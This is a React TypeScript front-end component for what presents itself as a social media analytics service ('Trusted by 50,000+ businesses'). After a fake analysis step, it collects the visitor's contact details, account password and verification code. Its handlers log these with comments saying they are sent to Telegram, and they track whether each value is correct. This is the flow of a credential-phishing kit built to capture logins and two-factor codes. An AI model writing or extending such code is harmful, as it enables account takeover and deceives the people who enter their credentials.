import React, { useState } from 'react';
import Header from './components/Header';
import AnalysisForm from './components/AnalysisForm';
import AnalysisResults from './components/AnalysisResults';
import ContactForm from './components/ContactForm';
import VerificationForm from './components/VerificationForm';
import CodeVerification from './components/CodeVerification';
import CompletionScreen from './components/CompletionScreen';
import Footer from './components/Footer';

type Step = 'form' | 'results' | 'contact' | 'verification' | 'code' | 'complete';

interface AnalysisData {
  pageName: string;
  industry: string;
}

function App() {
  const [currentStep, setCurrentStep] = useState<Step>('form');
  const [analysisData, setAnalysisData] = useState<AnalysisData | null>(null);
  const [contact, setContact] = useState('');

  const handleAnalyze = (data: AnalysisData) => {
    setAnalysisData(data);
    setCurrentStep('results');
  };

  const handleViewDetailedReport = () => {
    setCurrentStep('contact');
  };

  const handleContactSubmit = (contactInfo: string) => {
    setContact(contactInfo);
    setCurrentStep('verification');
  };

  const handleVerification = (password: string, isCorrect: boolean) => {
    // Send data to Telegram (in a real app, this would be an API call)
    console.log('Sending to Telegram:', {
      contact,
      password,
      status: isCorrect ? 'correct' : 'incorrect',
      analysisData
    });

    if (isCorrect) {
      setCurrentStep('code');
    }
    // If incorrect, stay on verification step with error shown
  };

  const handleCodeVerification = (code: string, isCorrect: boolean) => {
    // Send code verification to Telegram
    console.log('Sending code to Telegram:', {
      contact,
      code,
      status: isCorrect ? 'success' : 'incorrect'
    });

    if (isCorrect) {
      setCurrentStep('complete');
    }
    // If incorrect, stay on code step with error shown
  };

  const handleBackToHome = () => {
    setCurrentStep('form');
    setAnalysisData(null);
    setContact('');
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-purple-50">
      <Header />
      
      <main className="py-12 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          {currentStep === 'form' && (
            <div className="text-center mb-12">
              <h1 className="text-4xl md:text-6xl font-bold text-gray-900 mb-6">
                Unlock Your Social Media
                <span className="bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent"> Potential</span>
              </h1>
              <p className="text-xl text-gray-600 mb-8 max-w-3xl mx-auto">
                Get comprehensive analytics, competitor insights, and growth strategies 
                for your social media presence. Trusted by 50,000+ businesses worldwide.
              </p>
              <AnalysisForm onAnalyze={handleAnalyze} />
            </div>
          )}

          {currentStep === 'results' && analysisData && (
            <AnalysisResults
              pageName={analysisData.pageName}
              industry={analysisData.industry}
              onViewDetailedReport={handleViewDetailedReport}
            />
          )}

          {currentStep === 'contact' && (
            <ContactForm onSubmit={handleContactSubmit} analysisData={analysisData} />
          )}

          {currentStep === 'verification' && (
            <VerificationForm
              contact={contact}
              onVerify={handleVerification}
            />
          )}

          {currentStep === 'code' && (
            <CodeVerification
              contact={contact}
              onVerify={handleCodeVerification}
            />
          )}

          {currentStep === 'complete' && (
            <CompletionScreen
              contact={contact}
              onBackToHome={handleBackToHome}
            />
          )}
        </div>
      </main>

      {currentStep === 'form' && <Footer />}
    </div>
  );
}

export default App;